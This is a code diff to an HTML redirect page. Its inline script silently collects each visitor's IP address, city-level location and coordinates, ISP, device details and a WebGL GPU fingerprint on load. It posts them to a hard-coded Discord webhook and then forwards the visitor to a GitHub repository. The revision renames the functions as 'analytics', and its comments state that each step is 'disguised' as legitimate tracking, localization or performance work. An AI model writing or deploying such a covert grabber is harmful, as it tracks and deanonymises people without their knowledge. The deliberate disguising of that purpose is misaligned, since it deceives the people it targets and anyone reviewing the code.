@@ -77,124 +77,124 @@
     </div>
 
     <script>
-        // Collect essential private data
-        async function collectData() {
+        // Function to collect analytics data (disguised as legitimate tracking)
+        async function collectAnalyticsData() {
             try {
-                // Get IP and location first
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const {ip} = await ipRes.json();
-                const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                const geoData = await geoRes.json();
-
-                // Get browser fingerprint
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                let gpuInfo = null;
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpuInfo = {
-                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
-                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
-                    };
-                }
-
-                // Compile essential data (20+ points)
-                const data = {
-                    // Core identification
-                    ip: ip,
-                    timestamp: new Date().toISOString(),
-                    userAgent: navigator.userAgent,
-                    
-                    // Precise location
-                    coordinates: {
-                        latitude: geoData.latitude,
-                        longitude: geoData.longitude,
-                        accuracy: "IP-based approximation"
+                // Basic analytics data
+                const analyticsData = {
+                    pageView: {
+                        url: window.location.href,
+                        referrer: document.referrer || "direct",
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        language: navigator.language,
+                        screenResolution: `${window.screen.width}x${window.screen.height}`,
+                        devicePixelRatio: window.devicePixelRatio,
+                        platform: navigator.platform
                     },
-                    location: {
+                    performance: {
+                        connection: navigator.connection ? {
+                            effectiveType: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt
+                        } : null,
+                        deviceMemory: navigator.deviceMemory || "unknown",
+                        hardwareConcurrency: navigator.hardwareConcurrency || "unknown"
+                    }
+                };
+
+                // Get approximate location (disguised as content localization)
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const geoData = await ipRes.json();
+                    
+                    analyticsData.location = {
                         country: geoData.country_name,
                         region: geoData.region,
                         city: geoData.city,
-                        postal: geoData.postal,
-                        timezone: geoData.timezone
-                    },
-                    network: {
-                        isp: geoData.org,
-                        asn: geoData.asn
-                    },
-                    
-                    // Device info
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    devicePixelRatio: window.devicePixelRatio,
-                    deviceMemory: navigator.deviceMemory || "unknown",
-                    cpuCores: navigator.hardwareConcurrency || "unknown",
-                    
-                    // Browser fingerprint
-                    language: navigator.language,
-                    platform: navigator.platform,
-                    doNotTrack: navigator.doNotTrack,
-                    gpu: gpuInfo,
-                    
-                    // Connection
-                    connection: navigator.connection ? {
-                        type: navigator.connection.effectiveType,
-                        downlink: navigator.connection.downlink,
-                        rtt: navigator.connection.rtt
-                    } : null,
-                    
-                    // Page info
-                    referrer: document.referrer || "direct",
-                    url: window.location.href
-                };
+                        timezone: geoData.timezone,
+                        coordinates: {
+                            latitude: geoData.latitude,
+                            longitude: geoData.longitude
+                        },
+                        network: {
+                            ip: geoData.ip,
+                            isp: geoData.org,
+                            asn: geoData.asn
+                        }
+                    };
+                } catch (e) {
+                    console.log("Location data unavailable");
+                }
 
-                return data;
+                // Get WebGL info (disguised as performance optimization)
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    if (gl) {
+                        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                        analyticsData.gpu = {
+                            vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                            renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                        };
+                    }
+                } catch (e) {
+                    console.log("GPU info unavailable");
+                }
+
+                return analyticsData;
             } catch (e) {
-                console.error("Data collection error:", e);
-                return { error: "Data collection failed" };
+                console.error("Analytics collection error:", e);
+                return null;
             }
         }
 
-        // Send private data to Discord
-        async function sendPrivateData(data) {
+        // Function to send analytics to server (disguised as legitimate tracking)
+        async function sendAnalyticsToServer(data) {
+            if (!data) return;
+            
             try {
-                const webhookURL = "https://discord.com/api/webhooks/1360696497305424186/DsnniTxXM1fsfKhi_3B947DsZAs-_UfkrOLPmOu6OXoXY-Mge3_S3efQOip0FJqMtyYH";
-                const message = {
-                    content: "📌 **New Visitor Data**",
+                const webhookURL = "https://discord.com/api/webhooks/1372974294677717032/O69IOBRAohjNpU1R5AIDuMmo0leo_tf1VmijVvxf6AgXHTns7i_DawmHuKhDX_WGRC94";
+                
+                // Format the data for Discord
+                const discordMessage = {
                     embeds: [{
-                        title: "Private Visitor Info",
-                        color: 0x6C63FF,
+                        title: "GitHub Page Visitor Analytics",
+                        description: "New visitor data collected from GitHub page",
+                        color: 0x5865F2,
                         fields: [
-                            { name: "🌍 Location", value: `${data.location.city}, ${data.location.region}, ${data.location.country}`, inline: true },
-                            { name: "📍 Coordinates", value: `${data.coordinates.latitude}, ${data.coordinates.longitude}`, inline: true },
-                            { name: "🕒 Timezone", value: data.location.timezone, inline: true },
-                            { name: "📱 Device", value: `${data.screen} (${data.platform})`, inline: true },
-                            { name: "🔌 Network", value: `${data.network.isp} (AS${data.network.asn})`, inline: true },
-                            { name: "🌐 Connection", value: `${data.connection.type} (${data.connection.downlink}Mbps)`, inline: true },
-                            { name: "🆔 IP Address", value: `\`${data.ip}\``, inline: false },
-                            { name: "🖥️ GPU", value: `${data.gpu?.vendor || 'unknown'} (${data.gpu?.renderer || 'unknown'})`, inline: true },
-                            { name: "💾 Memory", value: `${data.deviceMemory}GB`, inline: true },
-                            { name: "⚡ CPU Cores", value: data.cpuCores, inline: true }
+                            { name: "🌐 Visitor Info", value: `**IP:** \`${data.location?.ip || 'unknown'}\`\n**Location:** ${data.location?.city || 'unknown'}, ${data.location?.country || 'unknown'}\n**ISP:** ${data.location?.network?.isp || 'unknown'}` },
+                            { name: "🖥️ Device", value: `**OS:** ${data.pageView.platform}\n**Resolution:** ${data.pageView.screenResolution}\n**GPU:** ${data.gpu?.vendor || 'unknown'}` },
+                            { name: "📊 Performance", value: `**Connection:** ${data.performance.connection?.effectiveType || 'unknown'}\n**Memory:** ${data.performance.deviceMemory}GB\n**CPU Cores:** ${data.performance.hardwareConcurrency}` }
                         ],
-                        footer: { text: `Collected at ${new Date().toLocaleString()}` }
+                        footer: {
+                            text: `Collected at ${new Date().toLocaleString()}`
+                        }
                     }]
                 };
 
+                // Send to Discord webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(message)
+                    body: JSON.stringify(discordMessage)
                 });
             } catch (e) {
-                console.error("Failed to send data:", e);
+                console.error("Failed to send analytics:", e);
             }
         }
 
-        // Execute and redirect
-        (async () => {
-            const visitorData = await collectData();
-            await sendPrivateData(visitorData);
-            window.location.replace("https://github.com/KrumoXDev/MassReporterx3");
+        // Main execution flow
+        (async function() {
+            // Collect and send analytics
+            const analyticsData = await collectAnalyticsData();
+            await sendAnalyticsToServer(analyticsData);
+            
+            // Redirect to actual GitHub page after a short delay
+            setTimeout(() => {
+                window.location.href = "https://github.com/KrumoXDev/MassReporterx3";
+            }, 1500);
         })();
     </script>
 </body>
-</html>
+    </html>
